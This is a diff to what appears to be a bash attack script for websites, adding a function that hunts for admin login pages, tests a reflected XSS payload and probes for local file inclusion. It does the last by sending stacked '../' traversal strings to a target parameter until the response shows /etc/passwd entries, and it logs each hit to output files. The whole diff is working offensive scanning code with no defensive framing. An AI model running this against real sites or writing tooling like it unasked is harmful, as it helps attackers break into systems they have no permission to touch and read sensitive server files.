@@ -424,6 +424,75 @@ else
 fi
 }
 
+
+
+dorkscan() {
+  true_lfi="n"
+  dir=$(echo "$b" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
+  mkdir -p output/$dir
+  for admin in `echo "$admin_dork" | tr -d '\0' | sed 's/\r$//'`
+    do
+      ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
+      if echo "$ngecurl" | grep -Po "200 OK" >/dev/null
+      then
+          if echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null
+          then
+               if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
+               then
+                  echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site/$admin"
+                  echo "bad" >> .wp
+               else
+                  found="y"
+                  mkdir -p output/$dir
+                  if [[ "$ddebug" = "y" ]];then
+                     echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
+                  fi
+                  echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site/$admin"
+                  echo "$site/$admin" >> $result_admin
+                  echo "$site/$admin" >> output/$dir/admin-login.txt
+                  echo "bad" >> .live
+               fi
+          else
+              echo -e "\x1b[0m${N}[${G}+${N}] ${G}\033[2m200 OK ${N}:\033[2m $site/$admin"
+              echo "bad" >> .live
+          fi
+          continue
+      else
+          echo -e "${N}[${R}!${N}] \033[2mNOT FOUND : $site/$admin"
+          echo "bad" >> .bad
+      fi
+   done
+   if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -sL --max-time $time_out "$b$xss_payload" | grep -Po "kedjaw3n" | tr -d '\0' | sed 's/\r$//' >/dev/null
+   then
+       echo -e "${N}[${O}*${N}] ${BL}XSS : $b$xss_payload${N}"
+       echo -e "$b$xss_payload" >> output/$dir/xss.txt
+   fi
+   echo -en "\x1b[0m${N}[${O}!${N}] ${G}\033[2mscaning lfi..."
+   b2=$(echo "$b" | cut -d "=" -f1)
+   for hitung in $(seq $lfi_count)
+    do
+      spin
+      lfi=$(seq -s "/" 0 $hitung | sed "s|/|../|g" | sed "s/[0-9]*//g")
+      ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$b2=$lfi$lfi_payload")
+      if [[ "$debug" = "y" ]];then
+         echo "$b2=$lfi$lfi_payload"
+      fi
+      if echo "$ngecurl" | grep -P "root:|daemon:|bin:|sys:" >/dev/null
+         then
+            true_lfi="y"
+            mkdir -p output/$dir
+            echo -en "\n\x1b[0m${N}[${G}+${N}] ${G}LFI ${N}:\033[2m $b2=$lfi$lfi_payload"
+            echo "$b2=$lfi$lfi_payload" >> output/$dir/lfi.txt
+            break
+      fi
+   done;endspin;
+   if [[ "$true_lfi" = "n" ]];then
+      echo -e "\x1b[0m${N}[${R}*${N}] \033[2mLFI : Not vuln"
+   fi;echo -en "\n"
+}
+
+
+
 esql() {
   waff="n"
   site=$(echo "$site" | sed "s/'//g" | sed "s/%27//g")
